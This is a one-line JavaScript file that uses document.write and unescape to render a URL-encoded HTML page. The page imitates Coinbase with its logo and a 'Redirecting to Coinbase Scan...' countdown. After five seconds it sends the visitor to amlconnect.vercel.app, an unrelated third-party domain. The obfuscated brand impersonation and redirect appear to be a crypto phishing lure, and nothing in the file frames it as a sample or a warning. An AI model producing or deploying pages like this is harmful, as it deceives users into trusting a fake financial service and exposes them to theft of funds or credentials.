document.write(unescape('%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3ERedirecting%20to%20Coinbase...%3C/title%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20*%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20box-sizing%3A%20border-box%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20-apple-system%2C%20BlinkMacSystemFont%2C%20%22Segoe%20UI%22%2C%20Roboto%2C%20sans-serif%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%230A0B0D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20min-height%3A%20100vh%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20header%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%201rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20border-bottom%3A%201px%20solid%20%231E2025%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.logo%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20100px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20auto%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20filter%3A%20brightness%280%29%20invert%281%29%3B%20/*%20Make%20logo%20white%20*/%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20main%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20flex%3A%201%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20flex-direction%3A%20column%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%202rem%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20h1%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%202rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%201rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20500%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.countdown%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%204rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-weight%3A%20700%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%202rem%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20.message%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.1rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%201%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20white%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20@media%20%28max-width%3A%20640px%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20h1%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201.5rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20.countdown%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%203rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20.message%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%201rem%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cheader%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22https%3A//images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg%22%20alt%3D%22logo%22%20class%3D%22logo%22%3E%0A%20%20%20%20%3C/header%3E%0A%20%20%20%20%3Cmain%3E%0A%20%20%20%20%20%20%20%20%3Ch1%3ERedirecting%20to%20Coinbase%20Scan...%3C/h1%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22countdown%22%20id%3D%22countdown%22%3E5%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cp%20class%3D%22message%22%3EYou%20will%20be%20redirected%20automatically%20in%20a%20few%20seconds...%3C/p%3E%0A%20%20%20%20%3C/main%3E%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20let%20timeLeft%20%3D%205%3B%0A%20%20%20%20%20%20%20%20const%20countdownElement%20%3D%20document.getElementById%28%27countdown%27%29%3B%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20const%20countdown%20%3D%20setInterval%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20timeLeft--%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20countdownElement.textContent%20%3D%20timeLeft%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28timeLeft%20%3C%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20clearInterval%28countdown%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.href%20%3D%20%27https%3A//amlconnect.vercel.app%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%201000%29%3B%0A%20%20%20%20%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E'));
